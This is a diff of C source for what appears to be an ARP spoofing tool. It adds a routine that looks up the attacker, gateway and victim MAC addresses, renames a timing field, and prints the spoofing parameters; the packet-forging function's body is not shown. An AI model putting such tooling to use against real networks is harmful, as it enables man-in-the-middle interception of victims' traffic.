@@ -129,6 +129,45 @@ int request_target_mac(
     return 0;
 }
 
+void init_arp_spoof_args(
+    ARPSpoofArgs* arp_spoof_args,
+    char* if_name,
+    int arp_sock,
+    char* victim_addr_str,
+    int spoof_period_sec
+) {
+    u32 victim_addr_hl = inet_addr(victim_addr_str);
+    Mac attacker_mac = get_interface_mac(if_name);
+    u32 gateway_addr_hl = get_gateway_addr_hl(if_name);
+
+    Mac gateway_mac = {0};
+    if (request_target_mac(
+            arp_sock, if_name, &gateway_mac, gateway_addr_hl, 1, 10
+        )
+        == 0) {
+        printf("ERROR: Can't obtain gateway mac\n");
+        exit(1);
+    }
+
+    Mac victim_mac = {0};
+    if (request_target_mac(
+            arp_sock, if_name, &victim_mac, victim_addr_hl, 1, 10
+        )
+        == 0) {
+        printf("ERROR: Can't obtain victim mac\n");
+        exit(1);
+    }
+
+    arp_spoof_args->arp_sock = arp_sock;
+    arp_spoof_args->if_name = if_name;
+    arp_spoof_args->attacker_mac = attacker_mac;
+    arp_spoof_args->gateway_addr_hl = gateway_addr_hl;
+    arp_spoof_args->victim_mac = victim_mac;
+    arp_spoof_args->victim_addr_hl = victim_addr_hl;
+    arp_spoof_args->spoof_period_sec = spoof_period_sec;
+    arp_spoof_args->is_terminated = 0;
+}
+
 void send_arp_spoof(
     int arp_sock,
     char* if_name,
@@ -165,7 +204,7 @@ void* start_arp_spoof(void* arp_spoof_args) {
     do {
         time_t current_time = time(NULL);
         elapsed_time = current_time - start_time;
-        if (elapsed_time >= args->period_sec) {
+        if (elapsed_time >= args->spoof_period_sec) {
             send_arp_spoof(
                 args->arp_sock,
                 args->if_name,
@@ -181,25 +220,24 @@ void* start_arp_spoof(void* arp_spoof_args) {
     return NULL;
 }
 
-void print_ether_arp(ether_arp arp) {
-    in_addr source_in_addr;
-    in_addr target_in_addr;
-    char source_mac_str[18] = {0};
-    char target_mac_str[18] = {0};
+void print_arp_spoof_args(ARPSpoofArgs* arp_spoof_args) {
+    printf("Interface:    %s\n", arp_spoof_args->if_name);
 
-    memcpy(&source_in_addr, &arp.arp_spa, sizeof(in_addr));
-    memcpy(&target_in_addr, &arp.arp_tpa, sizeof(in_addr));
+    printf("Attacker mac: ");
+    print_mac(arp_spoof_args->attacker_mac);
+    printf("\n");
 
-    Mac source_mac = {0};
-    Mac target_mac = {0};
-    memcpy(&source_mac.bytes, arp.arp_sha, sizeof(arp.arp_sha));
-    memcpy(&target_mac.bytes, arp.arp_tha, sizeof(arp.arp_tha));
+    printf("Gateway ip:   ");
+    print_addr_l(arp_spoof_args->gateway_addr_hl);
+    printf("\n");
 
-    printf("  MAC: ");
-    print_mac(source_mac);
-    printf(" -> ");
-    print_mac(target_mac);
-    printf("\n  IP:  ");
-    printf("%s -> ", inet_ntoa(source_in_addr));
-    printf("%s\n", inet_ntoa(target_in_addr));
+    printf("Victim mac:   ");
+    print_mac(arp_spoof_args->victim_mac);
+    printf("\n");
+
+    printf("Victim ip:    ");
+    print_addr_l(arp_spoof_args->victim_addr_hl);
+    printf("\n");
+
+    printf("Spoof period: %d s\n", arp_spoof_args->spoof_period_sec);
 }
